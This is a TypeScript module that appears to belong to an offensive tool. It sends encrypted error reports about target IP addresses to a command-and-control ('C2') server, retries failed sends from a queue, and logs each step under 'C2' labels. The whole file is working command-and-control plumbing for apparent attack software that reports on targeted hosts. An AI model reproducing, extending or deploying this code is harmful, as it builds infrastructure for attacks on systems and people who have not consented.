
import { ErrorLog } from '../../types/index.ts';
import { logger } from '../utils/logger.ts';
import { encrypt } from './crypto.ts';
import axios from 'axios';

const C2_URL = `http://localhost:${process.env.C2_PORT || 4000}`;
const reportQueue: { error: ErrorLog; key: string }[] = [];

const flushReportQueue = async (): Promise<void> => {
    if (reportQueue.length === 0) {
        return;
    }
    logger.info(`[C2 Queue]: Attempting to flush ${reportQueue.length} queued reports...`);
    const queuedReports = [...reportQueue];
    reportQueue.length = 0;

    const flushPromises = queuedReports.map(async (report) => {
        try {
            const encryptedPayload = encrypt(report.error, report.key);
            await axios.post(`${C2_URL}/api/report`, {
                instanceId: process.pid,
                payload: encryptedPayload,
                key: report.key,
            });
            logger.info(`[C2 Queue]: Successfully sent queued report for ${report.error.targetIp}.`);
        } catch (e) {
            logger.warn(`[C2 Queue]: Failed to send queued report for ${report.error.targetIp}. Re-queuing.`);
            reportQueue.push(report);
        }
    });

    await Promise.allSettled(flushPromises);
    if(reportQueue.length > 0) {
        logger.warn(`[C2 Queue]: ${reportQueue.length} reports remain in queue after flush attempt.`);
    } else {
        logger.info(`[C2 Queue]: Successfully flushed all reports.`);
    }
};

export const reportFailure = async (error: ErrorLog, key: string): Promise<void> => {
    const instanceId = process.pid;
    logger.warn(`Module [C2]: Encrypting and reporting failure to C2 for instance ${instanceId}: ${error.type} on ${error.targetIp}`);
    
    try {
        const encryptedPayload = encrypt(error, key);
        
        await axios.post(`${C2_URL}/api/report`, {
            instanceId,
            payload: encryptedPayload,
            key,
        });
        
        logger.info(`Module [C2]: Successfully reported failure for instance ${instanceId}.`);
        
        if (reportQueue.length > 0) {
            await flushReportQueue();
        }

    } catch (e: any) {
        const errorMessage = e.response ? JSON.stringify(e.response.data) : e.message;
        logger.error(`Module [C2]: Failed to report to C2 server for instance ${instanceId}. Error: ${errorMessage}`);
        logger.warn(`Module [C2]: Queuing report for later delivery.`);
        reportQueue.push({ error, key });
    }
};